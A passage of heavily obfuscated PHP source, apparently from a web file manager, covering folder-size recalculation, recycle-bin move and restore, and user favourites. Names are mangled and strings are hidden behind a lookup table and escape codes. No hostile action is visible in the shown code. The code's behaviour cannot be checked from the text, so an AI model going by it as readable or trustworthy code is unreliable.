intval($ÜÏåÜÖõ[0][$Ø¨‡Äø[201]]); } $û¨¸‡ë = $this->sourceInfo($šœ§õò); $this->pathInfoFilter($û¨¸‡ë); return $û¨¸‡ë; } protected function updateModifyTime($çÈÆÖ•ş) { $ÚÊÓ¬ò… =& $_SERVER[øşô´çË]; $ïôĞ¿Í— = KodUser::id(); if (!$çÈÆÖ•ş) { return; } if (!is_array($çÈÆÖ•ş)) { $çÈÆÖ•ş = array($çÈÆÖ•ş); } foreach ($çÈÆÖ•ş as $éöÏËÙÈ => $ş¾‰šØ¿) { $çÈÆÖ•ş[$éöÏËÙÈ] = intval($ş¾‰šØ¿); $this->sourceCacheClear($ş¾‰šØ¿); } $·‚ô¢¶ï = array($ÚÊÓ¬ò…[201] => array($ÚÊÓ¬ò…[7], $çÈÆÖ•ş)); $”–ñÅÖè = array($ÚÊÓ¬ò…[682] => $ïôĞ¿Í—, $ÚÊÓ¬ò…[522] => time()); $this->where($·‚ô¢¶ï)->save($”–ñÅÖè); } public function folderSizeReset($Êñæ‰ú, $íõŠİù³ = false) { $üÏ¶É” =& $_SERVER[øşô´çË]; if ($this->statusIgnoreResetSpace) { return; } if (!$Êñæ‰ú) { return; } $Ã¬«¥‰´ = $this->sourceInfo($Êñæ‰ú); $Ø ‰Ö‹• = $üÏ¶É”[2496] . $Êñæ‰ú; if (!$Ã¬«¥‰´ || !$Ã¬«¥‰´[$üÏ¶É”[201]]) { return; } CacheLock::lock($Ø ‰Ö‹•, 20); if ($íõŠİù³ === !1) { $this->sourceCacheClear($Êñæ‰ú); $Ã¬«¥‰´ = $this->sourceInfo($Êñæ‰ú); $ï êÌ”¹ = array($üÏ¶É”[501] => $Êñæ‰ú, $üÏ¶É”[528] => 0); $ˆÙ¥¼ Ó = $this->where($ï êÌ”¹)->sum($üÏ¶É”[89]); $íõŠİù³ = intval($ˆÙ¥¼ Ó) - intval($Ã¬«¥‰´[$üÏ¶É”[89]]); } if ($íõŠİù³ == 0) { return CacheLock::unlock($Ø ‰Ö‹•); } $“Êšàì = $this->parentLevelArray($Ã¬«¥‰´[$üÏ¶É”[613]]); if (!$“Êšàì) { $“Êšàì = array(); } $“Êšàì[] = $Ã¬«¥‰´[$üÏ¶É”[201]]; $ï êÌ”¹ = array($üÏ¶É”[201] => array($üÏ¶É”[516], $“Êšàì)); if ($íõŠİù³ < 0) { $ï êÌ”¹[$üÏ¶É”[89]] = array($üÏ¶É”[1179], abs($íõŠİù³)); } $this->where($ï êÌ”¹)->setAdd($üÏ¶É”[89], $íõŠİù³); CacheLock::unlock($Ø ‰Ö‹•); if (!$Ã¬«¥‰´[$üÏ¶É”[598]] || $Ã¬«¥‰´[$üÏ¶É”[598]] == $üÏ¶É”[238]) { return; } $Å²„øÓ = $üÏ¶É”[2497] . $Ã¬«¥‰´[$üÏ¶É”[198]] . $üÏ¶É”[4] . $Ã¬«¥‰´[$üÏ¶É”[598]]; $’·¥å¿¥ = array($Ã¬«¥‰´[$üÏ¶É”[198]], $Ã¬«¥‰´[$üÏ¶É”[598]]); TaskRun::timeLimitCall($Å²„øÓ, $üÏ¶É”[2498], $’·¥å¿¥, 1.5); } public function folderSizeResetChildren($‘Ğâë¡û) { $Åù¾‰Ä =& $_SERVER[øşô´çË]; $this->sourceCacheClear($‘Ğâë¡û); $ã¡®‰ö = $this->sourceInfo($‘Ğâë¡û); if (!$ã¡®‰ö) { return; } $™Õ«Î×» = array($Åù¾‰Ä[677] => 1, $Åù¾‰Ä[680] => $ã¡®‰ö[$Åù¾‰Ä[598]], $Åù¾‰Ä[683] => array($Åù¾‰Ä[644], $ã¡®‰ö[$Åù¾‰Ä[613]] . $‘Ğâë¡û . $Åù¾‰Ä[645])); $¾òÜÎÊÏ = $Åù¾‰Ä[2499]; $’Î’ÂÀñ = $this->field($¾òÜÎÊÏ)->where($™Õ«Î×»)->select(); $™Õ«Î×»[$Åù¾‰Ä[509]] = 0; $¶¦½î“ = $this->field($¾òÜÎÊÏ)->where($™Õ«Î×»)->select(); if (!$¶¦½î“) { return; } $’Î’ÂÀñ[] = $ã¡®‰ö; $’Î’ÂÀñ = array_to_keyvalue($’Î’ÂÀñ, $Åù¾‰Ä[201]); foreach ($’Î’ÂÀñ as $¢´›Â¬ä => $ü‹Çô¬á) { $’Î’ÂÀñ[$¢´›Â¬ä][$Åù¾‰Ä[2500]] = $’Î’ÂÀñ[$¢´›Â¬ä][$Åù¾‰Ä[89]]; $’Î’ÂÀñ[$¢´›Â¬ä][$Åù¾‰Ä[89]] = 0; } foreach ($¶¦½î“ as $ü‹Çô¬á) { $¿é©Ï‡ = $ü‹Çô¬á[$Åù¾‰Ä[200]] . $Åù¾‰Ä[12]; if (!isset($’Î’ÂÀñ[$¿é©Ï‡])) { continue; } if ($ü‹Çô¬á[$Åù¾‰Ä[529]] == $’Î’ÂÀñ[$¿é©Ï‡][$Åù¾‰Ä[529]]) { $’Î’ÂÀñ[$¿é©Ï‡][$Åù¾‰Ä[89]] += $ü‹Çô¬á[$Åù¾‰Ä[89]]; } } foreach ($’Î’ÂÀñ as $ü‹Çô¬á) { $ñ¯ˆ¨¢„ = $this->parentLevelArray($ü‹Çô¬á[$Åù¾‰Ä[613]]); foreach ($ñ¯ˆ¨¢„ as $¿é©Ï‡) { $¿é©Ï‡ = $¿é©Ï‡ . $Åù¾‰Ä[12]; if (!isset($’Î’ÂÀñ[$¿é©Ï‡])) { continue; } if ($ü‹Çô¬á[$Åù¾‰Ä[529]] == $’Î’ÂÀñ[$¿é©Ï‡][$Åù¾‰Ä[529]]) { $’Î’ÂÀñ[$¿é©Ï‡][$Åù¾‰Ä[89]] += $ü‹Çô¬á[$Åù¾‰Ä[89]]; } } } $È›–Ñéş = array(); foreach ($’Î’ÂÀñ as $ü‹Çô¬á) { if ($ü‹Çô¬á[$Åù¾‰Ä[89]] == $ü‹Çô¬á[$Åù¾‰Ä[2500]]) { continue; } $È›–Ñéş[] = array($Åù¾‰Ä[201], $ü‹Çô¬á[$Åù¾‰Ä[201]], $Åù¾‰Ä[89], $ü‹Çô¬á[$Åù¾‰Ä[89]]); } $this->saveAll($È›–Ñéş); } public function userSpaceReset($šøÃ€Š» = false) { $‰ûÄ˜¤Ñ =& $_SERVER[øşô´çË]; $ÈÙãËÑ† = $this->where(array($‰ûÄ˜¤Ñ[198] => self::TYPE_USER, $‰ûÄ˜¤Ñ[598] => $šøÃ€Š», $‰ûÄ˜¤Ñ[509] => 0))->sum($‰ûÄ˜¤Ñ[89]); $ÈÙãËÑ† = !$ÈÙãËÑ† || $ÈÙãËÑ† <= 0 ? 0 : $ÈÙãËÑ†; Model($‰ûÄ˜¤Ñ[606])->userEdit($šøÃ€Š», array($‰ûÄ˜¤Ñ[2166] => $ÈÙãËÑ†)); } public function targetSpaceUpdate($—Ì¬ø, $„¿––ò£) { $¬¿íòÊ¥ =& $_SERVER[øşô´çË]; if (!$„¿––ò£) { return; } if (!in_array($—Ì¬ø, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $—Úõˆï = $this->targetSpaceSize($—Ì¬ø, $„¿––ò£); if ($—Ì¬ø == self::TYPE_USER) { Model($¬¿íòÊ¥[606])->userEdit($„¿––ò£, array($¬¿íòÊ¥[2166] => $—Úõˆï)); } else { if ($—Ì¬ø == self::TYPE_GROUP) { Model($¬¿íòÊ¥[614])->groupEdit($„¿––ò£, array($¬¿íòÊ¥[2166] => $—Úõˆï)); } } } public function targetSpaceSize($ç›Úú¬à, $„ï˜ÑÀï) { $«„ÔÚï =& $_SERVER[øşô´çË]; $ŠŒ§¨ö³ = 0; $¿ÏğÕ„… = $this->targetSourceRoot($ç›Úú¬à, $„ï˜ÑÀï, !0); foreach ($¿ÏğÕ„… as $²„™¡·) { if (!$²„™¡·) { continue; } $ŠŒ§¨ö³ += floatval($²„™¡·[$«„ÔÚï[89]]); $Æ­çúÅò = array($«„ÔÚï[683] => array($«„ÔÚï[644], $«„ÔÚï[622] . $²„™¡·[$«„ÔÚï[201]] . $«„ÔÚï[645])); $èÓÜÕÛƒ = Model($«„ÔÚï[527])->field($«„ÔÚï[515])->where($Æ­çúÅò)->select(); $èÓÜÕÛƒ = array_to_keyvalue($èÓÜÕÛƒ, $«„ÔÚï[12], $«„ÔÚï[201]); $èÓÜÕÛƒ = array_unique(array_filter($èÓÜÕÛƒ)); if ($èÓÜÕÛƒ) { $Æ­çúÅò = array($«„ÔÚï[515] => array($«„ÔÚï[516], $èÓÜÕÛƒ)); $ŠŒ§¨ö³ += floatval($this->where($Æ­çúÅò)->sum($«„ÔÚï[89])); } } $ŠŒ§¨ö³ = !$ŠŒ§¨ö³ || $ŠŒ§¨ö³ <= 0 ? 0 : $ŠŒ§¨ö³; return $ŠŒ§¨ö³; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ æ›Ğìœ) { return $this->fileTypeProfile($ æ›Ğìœ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ÚÀù˜åÜ) { return $this->fileTypeProfile($ÚÀù˜åÜ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¢¡ßËÎú, $ÉÅçÜ») { $Æ£Ò¼Ç =& $_SERVER[øşô´çË]; $öí°»‰ = $Æ£Ò¼Ç[2501] . $¢¡ßËÎú . $Æ£Ò¼Ç[11] . $ÉÅçÜ»; $—Ş½¢‘ = Cache::get($öí°»‰); if ($—Ş½¢‘) { return $—Ş½¢‘; } $—ûóşŸ = array($Æ£Ò¼Ç[677] => 0); if ($¢¡ßËÎú != !1) { $—ûóşŸ[$Æ£Ò¼Ç[598]] = $¢¡ßËÎú; $—ûóşŸ[$Æ£Ò¼Ç[198]] = $ÉÅçÜ»; } $º«¶¥‹ã = array(); $”¦ÛíÜû = $this->field(array($Æ£Ò¼Ç[951] => $Æ£Ò¼Ç[952], $Æ£Ò¼Ç[953] => $Æ£Ò¼Ç[89]))->where($—ûóşŸ)->find(); $º«¶¥‹ã[$Æ£Ò¼Ç[2502]] = array($Æ£Ò¼Ç[2503] => LNG($Æ£Ò¼Ç[2502]), $Æ£Ò¼Ç[2504] => intval($”¦ÛíÜû[$Æ£Ò¼Ç[952]]), $Æ£Ò¼Ç[649] => intval($”¦ÛíÜû[$Æ£Ò¼Ç[89]])); $«Æ°¸‚Ø = KodIO::fileTypeList(); foreach ($«Æ°¸‚Ø as $®×£Ú“· => $ì‘ÂË¥š) { $—ûóşŸ[$Æ£Ò¼Ç[510]] = $this->fileTypeWhere($®×£Ú“·); $”¦ÛíÜû = $this->field(array($Æ£Ò¼Ç[951] => $Æ£Ò¼Ç[952], $Æ£Ò¼Ç[953] => $Æ£Ò¼Ç[89]))->where($—ûóşŸ)->find(); $º«¶¥‹ã[$®×£Ú“·] = array($Æ£Ò¼Ç[2503] => $ì‘ÂË¥š[$Æ£Ò¼Ç[42]], $Æ£Ò¼Ç[2504] => intval($”¦ÛíÜû[$Æ£Ò¼Ç[952]]), $Æ£Ò¼Ç[649] => intval($”¦ÛíÜû[$Æ£Ò¼Ç[89]])); } Cache::set($öí°»‰, $º«¶¥‹ã, 1200); return $º«¶¥‹ã; } public function fileNameExist($¯¯¹©Ó¤, $¥°Âô®˜) { $¦­Úê¬³ =& $_SERVER[øşô´çË]; $èÓãÉÆˆ = $this->field($¦­Úê¬³[2505])->where(array($¦­Úê¬³[200] => $¯¯¹©Ó¤, $¦­Úê¬³[42] => $¥°Âô®˜, $¦­Úê¬³[529] => 0))->find(); return is_array($èÓãÉÆˆ) ? $èÓãÉÆˆ[$¦­Úê¬³[201]] : !1; } public function childList($­Òğ²«æ) { $´å§ëÏ× =& $_SERVER[øşô´çË]; $ÍÉšá¢Ô = $´å§ëÏ×[2478] . $­Òğ²«æ; if (isset(self::$cacheChildList[$ÍÉšá¢Ô])) { return self::$cacheChildList[$ÍÉšá¢Ô]; } $òŠ²Œ·˜ = array($´å§ëÏ×[200] => intval($­Òğ²«æ), $´å§ëÏ×[529] => 0); $ŠÉç¯ì² = $this->where($òŠ²Œ·˜)->select(); $ŠÉç¯ì² = $ŠÉç¯ì² ? $ŠÉç¯ì² : array(); self::$cacheChildList[$ÍÉšá¢Ô] = $ŠÉç¯ì²; foreach ($ŠÉç¯ì² as $ùƒ•»„©) { $ÍÉšá¢Ô = $´å§ëÏ×[556] . $ùƒ•»„©[$´å§ëÏ×[201]]; self::$cacheSourceInfo[$ÍÉšá¢Ô] = $ùƒ•»„©; } return $ŠÉç¯ì²; } public function fileNameAuto($›‘ëù÷, $ÏÇ™ÃÓÁ, $Ì¤ª’»² = REPEAT_RENAME, $ ¢¶ÎÃ = false) { $ëá®ß‡Ş =& $_SERVER[øşô´çË]; $Æ¬ÕŞñ‹ = get_path_ext($ÏÇ™ÃÓÁ); $Ó¢áºû = $Æ¬ÕŞñ‹ ? get_path_ext_name($ÏÇ™ÃÓÁ) . $ëá®ß‡Ş[2506] . $Æ¬ÕŞñ‹ : $ÏÇ™ÃÓÁ . $ëá®ß‡Ş[483]; $ğĞÜ×¼ = array($ëá®ß‡Ş[200] => $›‘ëù÷, $ëá®ß‡Ş[529] => 0, $ëá®ß‡Ş[42] => array($ëá®ß‡Ş[482], $Ó¢áºû)); $Õğ˜°ç = $this->field($ëá®ß‡Ş[42])->where($ğĞÜ×¼)->select(); $©ğûºŞÛ = array_to_keyvalue($Õğ˜°ç, $ëá®ß‡Ş[12], $ëá®ß‡Ş[42]); return $this->fileNameAutoGet($©ğûºŞÛ, $ÏÇ™ÃÓÁ, $Ì¤ª’»², $ ¢¶ÎÃ); } public function fileNameAutoGet($»‰÷ŸÓ, $±„ÇéÚ², $‘œ —¼á, $˜ƒª¸Öå) { $İÆÆçÔô =& $_SERVER[øşô´çË]; if ($‘œ —¼á == REPEAT_REPLACE || !$»‰÷ŸÓ || !in_array_not_case($±„ÇéÚ², $»‰÷ŸÓ) || $˜ƒª¸Öå && $‘œ —¼á != REPEAT_RENAME_FOLDER) { return $±„ÇéÚ²; } if ($‘œ —¼á == REPEAT_SKIP) { return !1; } $ãÊ»Ê±ñ = $İÆÆçÔô[10] . get_path_ext($±„ÇéÚ²); $ãÊ»Ê±ñ = $ãÊ»Ê±ñ == $İÆÆçÔô[10] || $˜ƒª¸Öå ? $İÆÆçÔô[12] : $ãÊ»Ê±ñ; for ($Æäº€«µ = 1; $Æäº€«µ <= count($»‰÷ŸÓ) + 1; $Æäº€«µ++) { $Õ’¼¹¤Ü = substr($±„ÇéÚ², 0, strlen($±„ÇéÚ²) - strlen($ãÊ»Ê±ñ)); $öğªÊõ³ = $Õ’¼¹¤Ü . "\x28{$Æäº€«µ}\x29{$ãÊ»Ê±ñ}"; if (!in_array_not_case($öğªÊõ³, $»‰÷ŸÓ)) { return $öğªÊõ³; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\x63\145\x5f\x72\x65\143\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\x54\151\155\145", "\164\151\155\145", "\151\156\163\x65\162\x74", "\x66\165\156\x63\x74\151\x6f\156")); public function listData($äèß†Ùï = false) { $®ôœÏ£® =& $_SERVER[øşô´çË]; $äèß†Ùï = $äèß†Ùï ? $äèß†Ùï : USER_ID; $†•¹‹É = $this->where(array($®ôœÏ£®[1964] => $äèß†Ùï))->select(); return array_to_keyvalue($†•¹‹É, $®ôœÏ£®[12], $®ôœÏ£®[201]); } public function moveToRecycle($ÕÂíâšÃ) { $÷ÊÄˆñ =& $_SERVER[øşô´çË]; $ÅÕÉÆŞó = Model($÷ÊÄˆñ[1529]); $”Ë¯¿şË = $ÅÕÉÆŞó->sourceInfo($ÕÂíâšÃ); if (!$”Ë¯¿şË || $”Ë¯¿şË[$÷ÊÄˆñ[529]] == $÷ÊÄˆñ[101]) { return; } $ÅæÇçŒ’ = array($÷ÊÄˆñ[515] => $ÕÂíâšÃ, $÷ÊÄˆñ[1964] => USER_ID, $÷ÊÄˆñ[679] => $”Ë¯¿şË[$÷ÊÄˆñ[198]], $÷ÊÄˆñ[680] => $”Ë¯¿şË[$÷ÊÄˆñ[598]], $÷ÊÄˆñ[683] => $”Ë¯¿şË[$÷ÊÄˆñ[613]]); $this->add($ÅæÇçŒ’); $this->recycleMove($ÕÂíâšÃ, 1); if ($”Ë¯¿şË[$÷ÊÄˆñ[509]] == $÷ÊÄˆñ[101]) { $ı®ŒíüĞ = array($÷ÊÄˆñ[683] => array($÷ÊÄˆñ[644], $”Ë¯¿şË[$÷ÊÄˆñ[613]] . $ÕÂíâšÃ . $÷ÊÄˆñ[645])); $ÅÕÉÆŞó->where($ı®ŒíüĞ)->setField($÷ÊÄˆñ[529], 1); } } public function clear() { $this->remove(!1); } public function remove($ÏÀ‰ûğ = false, $ÉÙ“¬”• = false) { $¼Âˆû =& $_SERVER[øşô´çË]; $ÉÙ“¬”• = $ÉÙ“¬”• ? $ÉÙ“¬”• : USER_ID; $¸¸ôÄã× = Model($¼Âˆû[1529]); $óïëÓ¢º = $this->listData($ÉÙ“¬”•); $ÏÀ‰ûğ = $ÏÀ‰ûğ === !1 ? !1 : $ÏÀ‰ûğ; $ùâöâ›Ê = array(); foreach ($óïëÓ¢º as $¼«ï²©¸) { if ($ÏÀ‰ûğ != !1 && !in_array($¼«ï²©¸, $ÏÀ‰ûğ)) { continue; } $€¸úéæ = $¸¸ôÄã×->sourceInfo($¼«ï²©¸); $¸¸ôÄã×->remove($¼«ï²©¸, !1); $™òÊ˜ó = $€¸úéæ[$¼Âˆû[198]] . $¼Âˆû[11] . $€¸úéæ[$¼Âˆû[598]]; $ùâöâ›Ê[$™òÊ˜ó] = array($¼Âˆû[679] => $€¸úéæ[$¼Âˆû[198]], $¼Âˆû[598] => $€¸úéæ[$¼Âˆû[598]]); $this->where(array($¼Âˆû[201] => $¼«ï²©¸))->delete(); } foreach ($ùâöâ›Ê as $¨·³«Æˆ) { $¸¸ôÄã×->targetSpaceUpdate($¨·³«Æˆ[$¼Âˆû[198]], $¨·³«Æˆ[$¼Âˆû[598]]); } } public function restore($äÅŞáÛÀ = false) { $±½Ó¨•´ = $this->listData(); $this->_restoreSource($±½Ó¨•´, $äÅŞáÛÀ); } public function removeUserAll($Óƒµ¢³³) { $this->remove(!1, $Óƒµ¢³³); } public function restoreItem($å€Ëß¬‰) { $this->_restoreSource(array($å€Ëß¬‰), array($å€Ëß¬‰)); } private function _restoreSource($êÍÁ²ë£, $ë‡€èé­) { $­ƒÑºù =& $_SERVER[øşô´çË]; $Æ¬‘’ÙÀ = Model($­ƒÑºù[1529]); $ë‡€èé­ = $ë‡€èé­ == !1 ? !1 : $ë‡€èé­; if (!$êÍÁ²ë£) { return !0; } $Ä¼ÊÅôº = array(); foreach ($êÍÁ²ë£ as $‹¸ù¶Ò) { if ($ë‡€èé­ != !1 && !in_array($‹¸ù¶Ò, $ë‡€èé­)) { continue; } $ ÕÆÖô« = $Æ¬‘’ÙÀ->sourceInfo($‹¸ù¶Ò); $úæ“°İÆ = $Æ¬‘’ÙÀ->sourceInfo($ ÕÆÖô«[$­ƒÑºù[200]]); if ($úæ“°İÆ[$­ƒÑºù[529]] == $­ƒÑºù[101]) { continue; } $Æ¬‘’ÙÀ->lockMoveStart($‹¸ù¶Ò); $this->recycleMove($‹¸ù¶Ò, 0); if ($ ÕÆÖô«[$­ƒÑºù[509]] == $­ƒÑºù[101]) { $ÅÅ·’ƒÍ = array($­ƒÑºù[683] => array($­ƒÑºù[644], $ ÕÆÖô«[$­ƒÑºù[613]] . $‹¸ù¶Ò . $­ƒÑºù[645])); $Æ¬‘’ÙÀ->where($ÅÅ·’ƒÍ)->setField($­ƒÑºù[529], 0); $this->restoreFolderChildren($‹¸ù¶Ò, $êÍÁ²ë£); } $this->where(array($­ƒÑºù[201] => $‹¸ù¶Ò))->delete(); $Æ¬‘’ÙÀ->folderSizeReset($ ÕÆÖô«[$­ƒÑºù[200]]); $Ä¼ÊÅôº[] = $ ÕÆÖô«[$­ƒÑºù[200]]; if ($ ÕÆÖô«[$­ƒÑºù[509]] == $­ƒÑºù[101]) { $Ä¼ÊÅôº[] = $‹¸ù¶Ò; } $Æ¬‘’ÙÀ->lockMoveEnd($‹¸ù¶Ò); } $Æ¬‘’ÙÀ->updateModifyTime($Ä¼ÊÅôº); } private function restoreFolderChildren($Ğ¶†ıàû, $¹ßÈÍğ¤) { $ˆüßŠƒ =& $_SERVER[øşô´çË]; $Ü³¦¹¸ = Model($ˆüßŠƒ[1529]); $â·Ú¨“ş = array($ˆüßŠƒ[201] => array($ˆüßŠƒ[7], array())); foreach ($¹ßÈÍğ¤ as $ÃÄÅùîò) { if ($ÃÄÅùîò == $Ğ¶†ıàû) { continue; } if (!$Ü³¦¹¸->isParentOf($Ğ¶†ıàû, $ÃÄÅùîò)) { continue; } $½˜ÕÅ…© = $Ü³¦¹¸->sourceInfo($ÃÄÅùîò); if ($½˜ÕÅ…©[$ˆüßŠƒ[509]] == $ˆüßŠƒ[101]) { $â·Ú¨“ş[] = array($ˆüßŠƒ[683] => array($ˆüßŠƒ[644], $½˜ÕÅ…©[$ˆüßŠƒ[613]] . $ÃÄÅùîò . $ˆüßŠƒ[645])); } else { $â·Ú¨“ş[$ˆüßŠƒ[201]][1][] = $ÃÄÅùîò; } } if (!$â·Ú¨“ş[$ˆüßŠƒ[201]][1]) { unset($â·Ú¨“ş[$ˆüßŠƒ[201]]); } if (!$â·Ú¨“ş) { return; } if (is_array($â·Ú¨“ş[$ˆüßŠƒ[201]]) && is_array($â·Ú¨“ş[$ˆüßŠƒ[201]][1])) { $â·Ú¨“ş[$ˆüßŠƒ[201]][1] = array_unique($â·Ú¨“ş[$ˆüßŠƒ[201]][1]); } $â·Ú¨“ş[$ˆüßŠƒ[1164]] = $ˆüßŠƒ[2280]; $Ü³¦¹¸->where($â·Ú¨“ş)->setField($ˆüßŠƒ[529], 1); } private function recycleMove($ôó»°£ã, $‘õõóÃì = 1) { $—é½¯×ˆ =& $_SERVER[øşô´çË]; $¦á‹²¶Ş = Model($—é½¯×ˆ[1529]); $á·£šÑÊ = Model($—é½¯×ˆ[2507]); $ü´²¦¥á = array($—é½¯×ˆ[201] => $ôó»°£ã); if ($‘õõóÃì) { $¦á‹²¶Ş->where($ü´²¦¥á)->setField($—é½¯×ˆ[529], 1); $á·£šÑÊ->eventRecycle($ôó»°£ã, $—é½¯×ˆ[2508]); } else { $·ãó³¸ä = $¦á‹²¶Ş->where($ü´²¦¥á)->find(); $Æ‰øÎÑÌ = $·ãó³¸ä[$—é½¯×ˆ[509]] == $—é½¯×ˆ[101]; $×ÕÈíœ = $¦á‹²¶Ş->fileNameAuto($·ãó³¸ä[$—é½¯×ˆ[200]], $·ãó³¸ä[$—é½¯×ˆ[42]], REPEAT_RENAME_FOLDER, $Æ‰øÎÑÌ); if ($×ÕÈíœ != $·ãó³¸ä[$—é½¯×ˆ[42]]) { $¦á‹²¶Ş->rename($ôó»°£ã, $×ÕÈíœ); } $¦á‹²¶Ş->where($ü´²¦¥á)->setField($—é½¯×ˆ[529], 0); $á·£šÑÊ->eventRecycle($ôó»°£ã, $—é½¯×ˆ[970]); } } } goto BÖÒ–”ÕàŞ; a“ÏêÉ‡«‹: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($‰É ÑúŞ) { $ÁßŞÛ«‡ =& $_SERVER[øşô´çË]; return array($ÁßŞÛ«‡[2292] => array(USER_ID, $ÁßŞÛ«‡[2665])); } protected function ___listData() { $ÇÃ­¯’ =& $_SERVER[øşô´çË]; $ÛÕ¾¸Ä­ = array($ÇÃ­¯’[1964] => USER_ID, $ÇÃ­¯’[582] => 0); $ĞŠÏ£Á± = $ÇÃ­¯’[2666]; $ãˆ¬ñ×± = $this->field($ĞŠÏ£Á±)->where($ÛÕ¾¸Ä­)->order($ÇÃ­¯’[2667])->select(); return $ãˆ¬ñ×± ? $ãˆ¬ñ×± : array(); } protected function resetCache() { } protected function listView() { $ì´…µæÀ =& $_SERVER[øşô´çË]; $á¹€Å©ä = $this->listData(); $÷”õê¦è = array_filter_by_field($á¹€Å©ä, $ì´…µæÀ[43], $ì´…µæÀ[514]); $°˜Ü‡Çª = array_to_keyvalue($÷”õê¦è, $ì´…µæÀ[12], $ì´…µæÀ[97]); if (!$°˜Ü‡Çª) { return $á¹€Å©ä; } $ıÅØıÎæ = 2000; $ÆŒ§Úğ = array($ì´…µæÀ[515] => array($ì´…µæÀ[516], $°˜Ü‡Çª)); $Òœ†Á = Model($ì´…µæÀ[935])->listSource($ÆŒ§Úğ, $ıÅØıÎæ); $Òœ†Á = array_merge($Òœ†Á[$ì´…µæÀ[96]], $Òœ†Á[$ì´…µæÀ[95]]); $Òœ†Á = array_to_keyvalue($Òœ†Á, $ì´…µæÀ[201]); foreach ($á¹€Å©ä as $ÈÈ³ü²„ => $µä‰¨¢™) { $Ìœ‹ƒÄù = $Òœ†Á[$µä‰¨¢™[$ì´…µæÀ[97]]]; $Ìœ‹ƒÄù = $Ìœ‹ƒÄù ? $Ìœ‹ƒÄù : array(); $á¹€Å©ä[$ÈÈ³ü²„] = array_merge($Ìœ‹ƒÄù, $µä‰¨¢™); } return $á¹€Å©ä; } protected function addFav($Ì“–ÅÏí, $ã¨šÛÇ = '', $ŒÇ™¬º¶ = "\163\157\x75\162\143\x65") { $²†‘çú¦ =& $_SERVER[øşô´çË]; $¬ˆõö‘  = array($²†‘çú¦[1964] => USER_ID, $²†‘çú¦[582] => 0, $²†‘çú¦[520] => $ŒÇ™¬º¶, $²†‘çú¦[519] => $Ì“–ÅÏí); if ($this->where($¬ˆõö‘ )->find()) { return !1; } $¬ˆõö‘  = array($²†‘çú¦[1964] => USER_ID, $²†‘çú¦[582] => 0); $—ÕÕª’ = $this->where($¬ˆõö‘ )->max($²†‘çú¦[2200]); if (!$—ÕÕª’) { $—ÕÕª’ = 0; } if (!$ã¨šÛÇ && $ŒÇ™¬º¶ == $²†‘çú¦[514]) { $¸†¦òÂä = Model($²†‘çú¦[1529])->where(array($²†‘çú¦[515] => $Ì“–ÅÏí))->find(); if (!$¸†¦òÂä) { return !1; } $ã¨šÛÇ = $¸†¦òÂä[$²†‘çú¦[42]]; } $ã¨šÛÇ = $this->getAutoName($ã¨šÛÇ); $Å™ëâí = array($²†‘çú¦[1964] => USER_ID, $²†‘çú¦[582] => 0, $²†‘çú¦[518] => $ã¨šÛÇ, $²†‘çú¦[519] => $Ì“–ÅÏí, $²†‘çú¦[520] => $ŒÇ™¬º¶, $²†‘çú¦[2182] => $—ÕÕª’ + 1); return $this->add($Å™ëâí); } protected function remove($Ò¾ûÑ¨õ) { $øşàòÓ× =& $_SERVER[øşô´çË]; $ñ¯‰ÖŠÇ = array($øşàòÓ×[1964] => USER_ID, $øşàòÓ×[517] => $Ò¾ûÑ¨õ); return $this->where($ñ¯‰ÖŠÇ)->delete(); } protected function removeByName($¯ĞÊÅÜ©) { $²èÔ€‡ó =& $_SERVER[øşô´çË]; $¤¤™–„¡ = array($²èÔ€‡ó[1964] => USER_ID, $²èÔ€‡ó[518] => $¯ĞÊÅÜ©, $²èÔ€‡ó[582] => 0); return $this->where($¤¤™–„¡)->delete(); } protected function rename($¡æÜú²Õ, $¸¦í§ë©) { $µÛœŒ¾Á =& $_SERVER[øşô´çË]; if ($¡æÜú²Õ == $¸¦í§ë©) { return !1; } $½€úÜÎ€ = $this->getAutoName($¸¦í§ë©); if ($¸¦í§ë© != $½€úÜÎ€) { return !1; } $€÷üÀÅ = array($µÛœŒ¾Á[1964] => USER_ID, $µÛœŒ¾Á[582] => 0, $µÛœŒ¾Á[42] => $¡æÜú²Õ); return $this->where($€÷üÀÅ)->save(array($µÛœŒ¾Á[42] => $¸¦í§ë©)); } protected function resetSort($‡»›Ò) { $¶ÖÎ¡Œ¡ =& $_SERVER[øşô´çË]; $‡»›Ò = is_array($‡»›Ò) ? $‡»›Ò : array(); $Ù³Ü…¡Í = array($¶ÖÎ¡Œ¡[1964] => USER_ID); for ($ĞÜÉŠ»Ù = 0; $ĞÜÉŠ»Ù < count($‡»›Ò); $ĞÜÉŠ»Ù++) { $Ù³Ü…¡Í[$¶ÖÎ¡Œ¡[517]] = $‡»›Ò[$ĞÜÉŠ»Ù]; $this->where($Ù³Ü…¡Í)->save(array($¶ÖÎ¡Œ¡[2182] => $ĞÜÉŠ»Ù + 1)); } return !0; } protected function moveTop($ƒÃ—€¾Â) { $™‚³¹Ì =& $_SERVER[øşô´çË]; $ƒ¢­‹ù· = array($™‚³¹Ì[1964] => USER_ID, $™‚³¹Ì[582] => 0); $û§èÜì = $this->where($ƒ¢­‹ù·)->where(array($™‚³¹Ì[42] => $ƒÃ—€¾Â))->find(); if (!$û§èÜì) { return; } $Éøàà¤ = $this->field($™‚³¹Ì[496])->where($ƒ¢­‹ù·)->order($™‚³¹Ì[2667])->select(); $Éøàà¤ = array_to_keyvalue($Éøàà¤, $™‚³¹Ì[12], $™‚³¹Ì[496]); $­³÷–ÓÏ = $Éøàà¤; $Éøàà¤ = array_remove_value($Éøàà¤, $û§èÜì[$™‚³¹Ì[496]]); array_unshift($Éøàà¤, $û§èÜì[$™‚³¹Ì[496]]); return $this->resetSort($Éøàà¤); } protected function moveBottom($ˆÅüĞœÌ) { $—£ ±™ =& $_SERVER[øşô´çË]; $Ù”û±ûÊ = array($—£ ±™[1964] => USER_ID, $—£ ±™[582] => 0); $˜ŞâĞş = $this->where($Ù”û±ûÊ)->max($—£ ±™[2200]); $²¦›‘ˆ® = array($—£ ±™[2200] => $˜ŞâĞş + 1); return $this->where($Ù”û±ûÊ)->where(array($—£ ±™[42] => 